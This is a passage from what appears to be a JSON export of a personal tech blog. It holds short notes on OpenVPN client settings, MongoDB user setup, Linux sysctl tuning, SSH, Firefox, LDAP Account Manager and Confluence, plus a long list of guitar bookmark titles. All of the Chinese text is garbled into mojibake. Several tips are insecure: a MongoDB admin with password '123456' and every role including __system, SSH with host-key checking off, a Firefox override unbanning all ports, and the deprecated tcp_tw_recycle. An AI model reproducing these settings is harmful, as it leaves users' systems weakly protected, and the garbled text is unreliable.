åœ¨Windowsç³»ç»Ÿä¸­ï¼Œå¦‚æœä½ æƒ³é…ç½®å¤šä¸ªéš§é“ï¼Œåˆ™éœ€è¦è¯¥æŒ‡ä»¤ã€‚ # ä½ éœ€è¦ç”¨åˆ°ç½‘ç»œè¿æ¥é¢æ¿ä¸­TAP-Win32é€‚é…å™¨çš„åç§°(ä¾‹å¦‚&quot;MyTap&quot;)ã€‚ # åœ¨XP SP2æˆ–æ›´é«˜ç‰ˆæœ¬çš„ç³»ç»Ÿä¸­ï¼Œä½ å¯èƒ½éœ€è¦ç¦ç”¨æ‰é’ˆå¯¹TAPé€‚é…å™¨çš„é˜²ç«å¢™ã€‚ ;dev-node MyTap # æŒ‡å®šè¿æ¥çš„æœåŠ¡å™¨æ˜¯é‡‡ç”¨TCPè¿˜æ˜¯UDPåè®®ã€‚ # è¿™é‡Œéœ€è¦ä½¿ç”¨ä¸æœåŠ¡å™¨ç«¯ç›¸åŒçš„è®¾ç½®ã€‚ ;proto tcp proto udp # æŒ‡å®šæœåŠ¡å™¨çš„ä¸»æœºå(æˆ–IP)ä»¥åŠç«¯å£å·ã€‚ # å¦‚æœæœ‰å¤šä¸ªVPNæœåŠ¡å™¨ï¼Œä¸ºäº†å®ç°è´Ÿè½½å‡è¡¡ï¼Œä½ å¯ä»¥è®¾ç½®å¤šä¸ªremoteæŒ‡ä»¤ã€‚ remote my-server-1 1194 ;remote my-server-2 1194 # å¦‚æœæŒ‡å®šäº†å¤šä¸ªremoteæŒ‡ä»¤ï¼Œå¯ç”¨è¯¥æŒ‡ä»¤å°†éšæœºè¿æ¥å…¶ä¸­çš„ä¸€å°æœåŠ¡å™¨ï¼Œ # å¦åˆ™ï¼Œå®¢æˆ·ç«¯å°†æŒ‰ç…§æŒ‡å®šçš„å…ˆåé¡ºåºä¾æ¬¡å°è¯•è¿æ¥æœåŠ¡å™¨ã€‚ ;remote-random # å¯ç”¨è¯¥æŒ‡ä»¤ï¼Œä¸æœåŠ¡å™¨è¿æ¥ä¸­æ–­åå°†è‡ªåŠ¨é‡æ–°è¿æ¥ï¼Œè¿™åœ¨ç½‘ç»œä¸ç¨³å®šçš„æƒ…å†µä¸‹(ä¾‹å¦‚ï¼šç¬”è®°æœ¬ç”µè„‘æ— çº¿ç½‘ç»œ)éå¸¸æœ‰ç”¨ã€‚ resolv-retry infinite # å¤§å¤šæ•°å®¢æˆ·ç«¯ä¸éœ€è¦ç»‘å®šæœ¬æœºç‰¹å®šçš„ç«¯å£å· nobind # åœ¨åˆå§‹åŒ–å®Œæ¯•åï¼Œé™ä½OpenVPNçš„æƒé™(è¯¥æŒ‡ä»¤ä»…é™äºéWindowsç³»ç»Ÿä¸­ä½¿ç”¨) ;user nobody ;group nobody # æŒä¹…åŒ–é€‰é¡¹å¯ä»¥å°½é‡é¿å…è®¿é—®åœ¨é‡å¯æ—¶ç”±äºç”¨æˆ·æƒé™é™ä½è€Œæ— æ³•è®¿é—®çš„æŸäº›èµ„æºã€‚ persist-key persist-tun # å¦‚æœä½ æ˜¯é€šè¿‡HTTPä»£ç†æ–¹å¼æ¥è¿æ¥åˆ°å®é™…çš„VPNæœåŠ¡å™¨ï¼Œè¯·åœ¨æ­¤å¤„æŒ‡å®šä»£ç†æœåŠ¡å™¨çš„ä¸»æœºå(æˆ–IP)å’Œç«¯å£å·ã€‚ # å¦‚æœä½ çš„ä»£ç†æœåŠ¡å™¨éœ€è¦èº«ä»½è®¤è¯ï¼Œè¯·å‚è€ƒå®˜æ–¹æ‰‹å†Œé¡µé¢ã€‚ ;http-proxy-retry # è¿æ¥å¤±è´¥æ—¶è‡ªåŠ¨é‡è¯• ;http-proxy [proxy server] [proxy port #] # æ— çº¿ç½‘ç»œé€šå¸¸ä¼šäº§ç”Ÿå¤§é‡çš„é‡å¤æ•°æ®åŒ…ã€‚è®¾ç½®æ­¤æ ‡è¯†å°†å¿½ç•¥æ‰é‡å¤æ•°æ®åŒ…çš„è­¦å‘Šä¿¡æ¯ã€‚ ;mute-replay-warnings # SSL/TLS å‚æ•°é…ç½®ã€‚ # æ›´å¤šæè¿°ä¿¡æ¯è¯·å‚è€ƒæœåŠ¡å™¨ç«¯é…ç½®æ–‡ä»¶ã€‚ # æœ€å¥½ä¸ºæ¯ä¸ªå®¢æˆ·ç«¯å•ç‹¬åˆ†é….crt/.keyæ–‡ä»¶å¯¹ã€‚ # å•ä¸ªCAè¯ä¹¦å¯ä»¥ä¾›æ‰€æœ‰å®¢æˆ·ç«¯ä½¿ç”¨ã€‚ ca ca.crt cert client.crt key client.key # æŒ‡å®šé€šè¿‡æ£€æŸ¥è¯ä¹¦çš„nsCertTypeå­—æ®µæ˜¯å¦ä¸º&quot;server&quot;æ¥éªŒè¯æœåŠ¡å™¨ç«¯è¯ä¹¦ã€‚ # è¿™æ˜¯é¢„é˜²æ½œåœ¨æ”»å‡»çš„ä¸€ç§é‡è¦æªæ–½ã€‚ # # ä¸ºäº†ä½¿ç”¨è¯¥åŠŸèƒ½ï¼Œä½ éœ€è¦åœ¨ç”ŸæˆæœåŠ¡å™¨ç«¯è¯ä¹¦æ—¶ï¼Œå°†å…¶ä¸­çš„nsCertTypeå­—æ®µè®¾ä¸º&quot;server&quot; # easy-rsaæ–‡ä»¶å¤¹ä¸­çš„build-key-serverè„šæœ¬æ–‡ä»¶å¯ä»¥è¾¾åˆ°è¯¥ç›®çš„ã€‚ ns-cert-type server # å¦‚æœæœåŠ¡å™¨ç«¯ä½¿ç”¨äº†tls-authå¯†é’¥ï¼Œé‚£ä¹ˆæ¯ä¸ªå®¢æˆ·ç«¯ä¹Ÿéƒ½åº”è¯¥æœ‰è¯¥å¯†é’¥ã€‚ ;tls-auth ta.key 1 # æŒ‡å®šå¯†ç çš„åŠ å¯†ç®—æ³•ã€‚ # å¦‚æœæœåŠ¡å™¨ç«¯å¯ç”¨äº†cipheræŒ‡ä»¤é€‰é¡¹ï¼Œé‚£ä¹ˆä½ å¿…é¡»ä¹Ÿåœ¨è¿™é‡ŒæŒ‡å®šå®ƒã€‚ ;cipher x # åœ¨VPNè¿æ¥ä¸­å¯ç”¨å‹ç¼©ã€‚ # è¯¥æŒ‡ä»¤çš„å¯ç”¨/ç¦ç”¨åº”è¯¥ä¸æœåŠ¡å™¨ç«¯ä¿æŒä¸€è‡´ã€‚ comp-lzo # è®¾ç½®æ—¥å¿—æ–‡ä»¶å†—ä½™çº§åˆ«(0~9)ã€‚ # 0 è¡¨ç¤ºé™é»˜è¿è¡Œï¼Œåªè®°å½•è‡´å‘½é”™è¯¯ã€‚ # 4 è¡¨ç¤ºåˆç†çš„å¸¸è§„ç”¨æ³•ã€‚ # 5 å’Œ 6 å¯ä»¥å¸®åŠ©è°ƒè¯•è¿æ¥é”™è¯¯ã€‚ # 9 è¡¨ç¤ºæåº¦å†—ä½™ï¼Œè¾“å‡ºéå¸¸è¯¦ç»†çš„æ—¥å¿—ä¿¡æ¯ã€‚ verb 3 # å¿½ç•¥è¿‡å¤šçš„é‡å¤ä¿¡æ¯ã€‚ # ç›¸åŒç±»åˆ«çš„ä¿¡æ¯åªæœ‰å‰20æ¡ä¼šè¾“å‡ºåˆ°æ—¥å¿—æ–‡ä»¶ä¸­ã€‚ ;mute 20","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"åˆå§‹åŒ– mongodb","slug":"history/tech/596daf015a209ca30c8a60b5","date":"2017-07-17T18:47:29.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/596daf015a209ca30c8a60b5/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/596daf015a209ca30c8a60b5/","excerpt":"","text":"mongodb shell æ‰§è¡Œ use admin db.createUser( { &quot;user&quot; : &quot;admin&quot;, &quot;pwd&quot;: &quot;123456&quot;, &quot;roles&quot; : [ { &quot;role&quot; : &quot;__system&quot;, &quot;db&quot; : &quot;admin&quot; }, { &quot;role&quot; : &quot;backup&quot;, &quot;db&quot; : &quot;admin&quot; }, { &quot;role&quot; : &quot;clusterAdmin&quot;, &quot;db&quot; : &quot;admin&quot; }, { &quot;role&quot; : &quot;clusterManager&quot;, &quot;db&quot; : &quot;admin&quot; }, { &quot;role&quot; : &quot;clusterMonitor&quot;, &quot;db&quot; : &quot;admin&quot; }, { &quot;role&quot; : &quot;dbAdmin&quot;, &quot;db&quot; : &quot;admin&quot; }, { &quot;role&quot; : &quot;dbAdminAnyDatabase&quot;, &quot;db&quot; : &quot;admin&quot; }, { &quot;role&quot; : &quot;dbOwner&quot;, &quot;db&quot; : &quot;admin&quot; }, { &quot;role&quot; : &quot;enableSharding&quot;, &quot;db&quot; : &quot;admin&quot; }, { &quot;role&quot; : &quot;hostManager&quot;, &quot;db&quot; : &quot;admin&quot; }, { &quot;role&quot; : &quot;read&quot;, &quot;db&quot; : &quot;admin&quot; }, { &quot;role&quot; : &quot;readAnyDatabase&quot;, &quot;db&quot; : &quot;admin&quot; }, { &quot;role&quot; : &quot;readWrite&quot;, &quot;db&quot; : &quot;admin&quot; }, { &quot;role&quot; : &quot;readWriteAnyDatabase&quot;, &quot;db&quot; : &quot;admin&quot; }, { &quot;role&quot; : &quot;restore&quot;, &quot;db&quot; : &quot;admin&quot; }, { &quot;role&quot; : &quot;root&quot;, &quot;db&quot; : &quot;admin&quot; }, { &quot;role&quot; : &quot;userAdmin&quot;, &quot;db&quot; : &quot;admin&quot; }, { &quot;role&quot; : &quot;userAdminAnyDatabase&quot;, &quot;db&quot; : &quot;admin&quot; } ] } );","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"mysql é•œåƒ","slug":"history/tech/596da1df5a209ca30c8a60b4","date":"2017-07-17T17:51:27.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/596da1df5a209ca30c8a60b4/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/596da1df5a209ca30c8a60b4/","excerpt":"","text":"souhu é•œåƒhttp://mirrors.sohu.com/mysql/MySQL-5.7/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"bootstrap","slug":"history/tech/596da1cf5a209ca30c8a60b3","date":"2017-07-17T17:51:11.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/596da1cf5a209ca30c8a60b3/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/596da1cf5a209ca30c8a60b3/","excerpt":"","text":"bootstrap æ¸…é™¤æ ·å¼","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"å‰ä»–èµ„æº","slug":"history/music/59699ef7388dc1a03e20106e","date":"2017-07-15T04:49:59.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/music/59699ef7388dc1a03e20106e/","link":"","permalink":"https://wangxiuwen.github.io/history/music/59699ef7388dc1a03e20106e/","excerpt":"","text":"studio guitar tuning tuningOpen Tunings for Rock And Metal++ Naomi Campbell Flaunts Her Supermodel Figure for Lâ€™Officiel Ukraine by An Le++ Van Weelden Royal Overdrive+++ Blog | Jamtrackcentral+++ Guitare :: improvisation - improviser Ã  la guitare+++ Top 5 Heavy Rig Rundowns | Premier Guitar*++++ Guitar School Garden | Cours de guitare gratuits en ligne**++++ Guitariste Metal - Interviews, Cours, Tests, Concours et plus !*108 Rock Star Guitars | Premier Guitar3Ã¨me pilier : montant du versement maximum, imposition et retrait - www.ch.ch50 steps to better electric guitar tone | 50 steps to better guitar tone | MusicRadar50 ways to become a better guitarist | Think outside the box | MusicRadarA tribute to MAchieving the Right Balance Between Volume and ToneAllen Hinds testing the Royal Overdrive by Peter van Weelden pt 2 - YouTubeAmazon.com: Lanikai LU-11 Soprano Ukulele: Musical InstrumentsApprendre Ã  jouer de la guitare en ligne | HGuitare.comAsile ParisAvis de Les Cowboys Etanches - Novation Launchpad - AudiofanzineBondage Film featuring Miley CyrusBrainworx | bx_rockrackBridge (music) - Wikipedia, the free encyclopediaChoosing the Right Mics for your Studiochuckdaloiamusic.comConnect With Your Favorite Guitarists | FRET12Dart: Structured web appsDavid Gilmourâ€™s 10 Weirdest RecordingsDavid Mead: Guitar Gym iOS AppDemeter TGA-1-180D Mighty Minnie Review | Premier GuitarDigging Deeper: Pentatonic Chords | 2014-04-10 | Premier GuitarDunlop Blog Â» How to Install the StraplokÂ® Strap Retainer System: A Step by Step PictorialDunlop Blog Â» The Distortion Guide (for Non-Engineers)Everything You Ever Wanted to Know About Preamp TubesEVHÂ® Product InformationFearedFidelity | Bimbo Story Clubfilter - larsjung.de &gt; h5ai &gt; demo &gt; filterForgotten Heroes: Emily Remler | Premier GuitarFree Lessonsfreestompboxes.org â€¢ Index pageFretboard Workshop: 10 Essential Turnarounds | 2013-12-13 | Premier GuitarFuture Rock: Shred Those Sequences | 2013-11-27 | Premier GuitarGary Clark Jr.: The Next Texas Flood | Fender Artist NewsGtpTabs.com - Guitar Pro TabsGuitar Adoptions - WallpaperGuitar Backing Tracks - YouTubeGuitar FX LayoutsGuitar Lovers | Gitarren EnzyklopÃ¤die | Guitar Encyclopediaguitar moderne | The Zine for Adventurous GuitaristsGuitar Shop 101: The Great Guitar Cleanup | Premier GuitarGuitar Tracks: Building a Mix | 2013-10-14 | Premier Guitarguitarforce.comHELIUMHome | JamtrackcentralHot-Rod Your Electric: Tiny Tone Tweaks, Done Dirt CheapHow to Balance Pickups on Strats and Teles - Premier GuitarHow to fix loose output jack on guitar with JackTight ToolsHow to Order Production Models | .strandberg* GuitarsHow to sound like Jerry Cantrell | I Heart GuitarHTML EntitiesInterview MagazineJobfactory Guitarcare - HomeJohnny A. â€œKrea Gataâ€ 8-17-13 - YouTubeJulia Anna Gospodarou - Architect | B&amp;W Fine Art PhotographerJulia Anna Gospodarou | Fine Art PhotographyKeira Knightley poses topless for Interview Magazine (Glamour.com UK)La RÃ©volution DeuxLearn to Play the Piano with the PianoMaestro USB Learning DeviceList of musical symbols - Wikipedia, the free encyclopediaLoog Guitars | The Best Guitars For ChildrenMetal Guitar Covers | A place for metal-heads and music-lovers alike.MMA Home PageMod Garage: Humbucker Height Adjustment | Premier GuitarMod Kits DIY Introduces the Aggressor | 2014-09-03 | Premier GuitarMusica VivaMusik Olar: Musikinstrumente Import Grosshandel VertriebNews Xotic lance une petite pÃ©dale Wah Wah - AudiofanzineOliver Ackermann: Death By Audio | Tape Op - the Creative Music Recording MagazineOWASP Zed Attack Proxy Project - OWASPpeggo - Record MP3s from YouTube and SoundCloudPiano Tutorials - Piano and Math Tutorialsplaythisriff.comPower Chords - Guitar NoisePremier Guitar - Premier Clinic - Premier Guitar magazine has the latest in guitar information and equipment along with music interviews, product reviews and much more.Rhythm Guitar For Intermediate To Advanced Players | Lessons @ Ultimate-Guitar.ComRhythm Rules: 6 Essential Exercises to Improve Your Groove | 2013-07-22 | Premier GuitarRhythm Rules: Syncopated 16th-Note Rhythms | Premier GuitarRiff of the WeekÂ® | RiffOfTheWeek.com | got riffs?â„¢Riffstation - Amazing Guitar SoftwareRig Rundown: Adrian Belew | Premier GuitarRig Rundown: The Sword | Premier GuitarRobert BakersecSecrets of Signal FlowSellThisGuitar.comShredmental: Hell-Bent for Rhythm! | 2014-12-19 | Premier GuitarSix-String Samurai | Gear talk for the GAS-afflicted.Speed Playing | Lessons @ Ultimate-Guitar.ComStyle Guide: All About Arpeggios | 2014-02-14 | Premier GuitarStyle Guide: Essential Blues Progressions | 2013-09-13 | Premier GuitarTech 21 Fly Rig 5 Review | Premier GuitarTempleboards - Pedalboards - ZubehÃ¶r - GitarrenoaseTerminologie du jazz â€” WikipÃ©diaThe 50 greatest guitar tones of all timeâ€¦ ever! | David Gilmour - Comfortably Numb, Pink Floyd: The Wall (1979) | MusicRadarThe Gibson Interview: Mastodonâ€™s Bill Kelliher on His â€˜Golden Axeâ€™ ExplorerThe Guitaristâ€™s Guide to Writing Charts | 2014-11-28 | Premier GuitarTHE HIDDEN MASTERSThe Mattson 2: Twinterconnectivity | Premier GuitarThe Quest for Good Guitar ToneThe Recording Guitarist: Dances with Compressors | Premier GuitarThe Road Guitaristâ€™'s StudioTone-GuardÂ® HomeTutorial | HydrogenVox StompLab IG | Guitar Reviews | MusicRadarWampler Pedals | Hand Made Boutique Guitar Effect Pedals | Heritage Series | Plexi-DrivewatchWelcome to Impro-VisorWILDSIDETRIBUTE.COM | Tribute to Motley CrueWonderful Watersportswww.riffstation.comwww.vanweelden.com ä¼´å¥ (backing tracks)Custom Backing Tracks - Guitar, Drums, Piano, Bass - Karaoke VersionFree Guitar Backing Tracks @ GuitarBackingTrack.comMon premier bluesNew Backing Tracksbona jam - YouTube++ db loops Blues - Volume 1 - db loops loopingIn The Loop: An Introduction to Looping | Guitar Worldguitar loop tutorial - Google SearchHow to Use a Looper Pedal: Basics - Guitar Gear FinderLooping Tips and TricksNail The Timing On Your First Loop | Looping Live","categories":[{"name":"éŸ³ä¹","slug":"éŸ³ä¹","permalink":"https://wangxiuwen.github.io/categories/%E9%9F%B3%E4%B9%90/"}],"tags":[{"name":"music","slug":"music","permalink":"https://wangxiuwen.github.io/tags/music/"},{"name":"éŸ³ä¹","slug":"éŸ³ä¹","permalink":"https://wangxiuwen.github.io/tags/%E9%9F%B3%E4%B9%90/"}],"author":"wangxiuwen"},{"title":"ldap-account-manager å®‰è£…","slug":"history/tech/596821e02139e0ad358b591a","date":"2017-07-14T01:44:00.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/596821e02139e0ad358b591a/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/596821e02139e0ad358b591a/","excerpt":"","text":"å®˜ç½‘ï¼šhttps://www.ldap-account-manager.org/lamcms/https://www.ldap-account-manager.org/static/doc/manual/index.htmlæŠ¥é”™:Your PHP has no LDAP support! Please install the LDAP extension for PHP. Your PHP has no XML support! Please install the XML extension for PHP. Your PHP has no ZIP support. Please install the ZIP extension for PHP. è§£å†³:apt install php-ldap apt install php-xml apt install php-zip å®‰è£…å®Œæ¯•åï¼Œå¯ä»¥è°ƒæ•´é€šç”¨è®¾ç½®è¾“å…¥é»˜è®¤å¯†ç :lam","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"linux å†…æ ¸å‚æ•°ä¼˜åŒ–","slug":"history/tech/59686581388dc1a03e20106d","date":"2017-07-13T18:32:33.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/59686581388dc1a03e20106d/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59686581388dc1a03e20106d/","excerpt":"","text":"å¦‚ä¸‹ï¼švm.swappiness = 0 net.ipv4.neigh.default.gc_stale_time=121 net.ipv4.conf.all.rp_filter=1 net.ipv4.conf.default.rp_filter=1 net.ipv4.conf.default.arp_announce = 2 net.ipv4.conf.all.arp_announce=2 net.ipv4.tcp_max_tw_buckets = 5111 net.ipv4.tcp_syncookies = 1 net.ipv4.tcp_max_syn_backlog = 1124 net.ipv4.tcp_synack_retries = 2 net.ipv6.conf.all.disable_ipv6 = 1 net.ipv6.conf.default.disable_ipv6 = 1 net.ipv6.conf.lo.disable_ipv6 = 1 net.ipv4.conf.lo.arp_announce=2 fs.file-max=65535 fs.inotify.max_user_instances = 8192 net.ipv4.tcp_syncookies = 1 net.ipv4.tcp_fin_timeout = 31 net.ipv4.tcp_tw_reuse = 1 net.ipv4.tcp_tw_recycle = 1 net.ipv4.ip_local_port_range = 1124 65111 net.ipv4.tcp_max_syn_backlog = 65536 net.ipv4.tcp_max_tw_buckets = 6111 net.ipv4.route.gc_timeout = 111 net.ipv4.tcp_syn_retries = 1 net.ipv4.tcp_synack_retries = 1 net.core.somaxconn = 65535 net.core.netdev_max_backlog = 262144 net.ipv4.tcp_timestamps = 0 net.ipv4.tcp_max_orphans = 262144 net.ipv4.ip_forward = 1 vm.max_map_count=262144 é»˜è®¤é…ç½®æ–‡ä»¶:# # /etc/sysctl.conf - Configuration file for setting system variables # See /etc/sysctl.d/ for additional system variables. # See sysctl.conf (5) for information. # #kernel.domainname = example.com # Uncomment the following to stop low-level messages on console #kernel.printk = 3 4 1 3 ##############################################################3 # Functions previously found in netbase # # Uncomment the next two lines to enable Spoof protection (reverse-path filter) # Turn on Source Address Verification in all interfaces to # prevent some spoofing attacks # Uncomment the next line to enable TCP/IP SYN cookies # See http://lwn.net/Articles/277146/ # Note: This may impact IPv6 TCP sessions too # Uncomment the next line to enable packet forwarding for IPv4 #net.ipv4.ip_forward=1 # Uncomment the next line to enable packet forwarding for IPv6 # Enabling this option disables Stateless Address Autoconfiguration # based on Router Advertisements for this host #net.ipv6.conf.all.forwarding=1 ################################################################### # Additional settings - these settings can improve the network # security of the host and prevent against some network attacks # including spoofing attacks and man in the middle attacks through # redirection. Some network environments, however, require that these # settings are disabled so review and enable them as needed. # # Do not accept ICMP redirects (prevent MITM attacks) #net.ipv4.conf.all.accept_redirects = 0 #net.ipv6.conf.all.accept_redirects = 0 # _or_ # Accept ICMP redirects only for gateways listed in our default # gateway list (enabled by default) # net.ipv4.conf.all.secure_redirects = 1 # # Do not send ICMP redirects (we are not a router) #net.ipv4.conf.all.send_redirects = 0 # # Do not accept IP source route packets (we are not a router) #net.ipv4.conf.all.accept_source_route = 0 #net.ipv6.conf.all.accept_source_route = 0 # # Log Martian Packets #net.ipv4.conf.all.log_martians = 1 # vm.swappiness = 0 net.ipv4.neigh.default.gc_stale_time=120 # see details in https://help.aliyun.com/knowledge_detail/39428.html net.ipv4.conf.all.rp_filter=0 net.ipv4.conf.default.rp_filter=0 net.ipv4.conf.default.arp_announce = 2 net.ipv4.conf.lo.arp_announce=2 net.ipv4.conf.all.arp_announce=2 # see details in https://help.aliyun.com/knowledge_detail/41334.html net.ipv4.tcp_max_tw_buckets = 5000 net.ipv4.tcp_syncookies = 1 net.ipv4.tcp_max_syn_backlog = 1024 net.ipv4.tcp_synack_retries = 2 net.ipv6.conf.all.disable_ipv6 = 1 net.ipv6.conf.default.disable_ipv6 = 1 net.ipv6.conf.lo.disable_ipv6 = 1 net.ipv4.ip_forward = 1 ä¿®æ”¹æ–¹æ³•:ä¿®æ”¹swappinesså€¼ä¸º0:sysctl vm.swappiness=0 //ä¸´æ—¶ä¿®æ”¹ æˆ–è€…vim /etc/sysctl.conf vm.swappiness=0 sysctl -p å‚æ•°å«ä¹‰ï¼š vm.swappiness ï¼ˆ/proc/sys/vm/swappinessï¼‰å–å€¼èŒƒå›´ï¼š0~100 è§£é‡Š:linux ä¼šä½¿ç”¨ç¡¬ç›˜çš„ä¸€éƒ¨åˆ†åšä¸ºSWAPåˆ†åŒºï¼Œç”¨æ¥è¿›è¡Œè¿›ç¨‹è°ƒåº¦â€“è¿›ç¨‹æ˜¯æ­£åœ¨è¿è¡Œçš„ç¨‹åºâ€“æŠŠå½“å‰ä¸ç”¨çš„è¿›ç¨‹è°ƒæˆâ€˜ç­‰å¾…ï¼ˆstandbyï¼‰ï¼Œç”šè‡³â€˜ç¡çœ ï¼ˆsleepï¼‰ï¼Œä¸€æ—¦è¦ç”¨ï¼Œå†è°ƒæˆâ€˜æ´»åŠ¨ï¼ˆactiveï¼‰ï¼Œç¡çœ çš„è¿›ç¨‹å°±èººåˆ°SWAPåˆ†åŒºç¡å¤§è§‰ï¼ŒæŠŠå†…å­˜ç©ºå‡ºæ¥è®©ç»™æ´»åŠ¨çš„è¿›ç¨‹ã€‚swappiness=0 çš„æ—¶å€™è¡¨ç¤ºæœ€å¤§é™åº¦ä½¿ç”¨ç‰©ç†å†…å­˜ï¼Œç„¶åæ‰æ˜¯ swapç©ºé—´ï¼Œswappinessï¼100çš„æ—¶å€™è¡¨ç¤ºç§¯æçš„ä½¿ç”¨swapåˆ†åŒºï¼Œå¹¶ä¸”æŠŠå†…å­˜ä¸Šçš„æ•°æ®åŠæ—¶çš„æ¬è¿åˆ°swapç©ºé—´é‡Œé¢ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ssh ä¸ç™»å½•æ‰§è¡Œå‘½ä»¤","slug":"history/tech/5966c9a12139e0ad358b5917","date":"2017-07-13T01:15:13.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/5966c9a12139e0ad358b5917/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5966c9a12139e0ad358b5917/","excerpt":"","text":"å¦‚ä¸‹ï¼šssh -o StrictHostKeyChecking=no -l username serverip &quot;touch 111&quot;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"æ­¤åœ°å€ä½¿ç”¨äº†ä¸€ä¸ªé€šå¸¸ç”¨äºç½‘ç»œæµè§ˆä»¥å¤–çš„ç«¯å£ã€‚å‡ºäºå®‰å…¨åŸå› ï¼ŒFirefox å–æ¶ˆäº†è¯¥è¯·æ±‚","slug":"history/tech/59672b0d2139e0ad358b5919","date":"2017-07-12T20:10:53.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/59672b0d2139e0ad358b5919/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59672b0d2139e0ad358b5919/","excerpt":"","text":"åœ¨Firefoxåœ°å€æ è¾“å…¥about:configç„¶ååœ¨å³é”®æ–°å»ºä¸€ä¸ªå­—ç¬¦ä¸²é”® network.security.ports.banned.override, æ·»åŠ å°†éœ€è®¿é—®ç½‘ç«™çš„ç«¯å£å·ï¼ˆå€¼å°±æ˜¯é‚£ä¸ªç«¯å£å·ï¼Œå¦‚æœ‰å¤šä¸ª,å°±åŠè§’é€—å·éš”å¼€,ä¾‹ï¼š81,88,98ã€‚åœ¨èƒ½ä¿è¯å®‰å…¨çš„å‰æä¸‹,è¿˜ç®€åŒ–æˆè¿™æ ·å†™0-65535ï¼‰ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"confluence ä¹±ç è§£å†³","slug":"history/tech/59672af22139e0ad358b5918","date":"2017-07-12T20:10:26.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/59672af22139e0ad358b5918/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59672af22139e0ad358b5918/","excerpt":"","text":"JDBCçš„é“¾æ¥è®¾ç½®ï¼š jdbc:mysql://hostname:port/database?useUnicode=true&amp;characterEncoding=utf8 å¦‚æœè®¾ç½®ç•Œé¢è®¾ç½®é”™è¯¯ï¼Œä¹‹åå¯ä»¥åœ¨ /var/atlassian/application-data/confluence/confluence.cfg.xml ä¿®æ”¹: &lt;property name=&quot;hibernate.connection.url&quot;&gt;jdbc:mysql://hostname:port/database?useUnicode=true&amp;amp;characterEncoding=utf8&lt;/property&gt; confluence é»˜è®¤å®‰è£…è·¯å¾„ï¼š/opt/atlassian/confluenceconfluence é»˜è®¤æ•°æ®è·¯å¾„ï¼š/var/atlassian/application-data/confluencemysql éœ€è¦æ˜¯ utf-8 çš„æ•°æ®åº“: CREATE 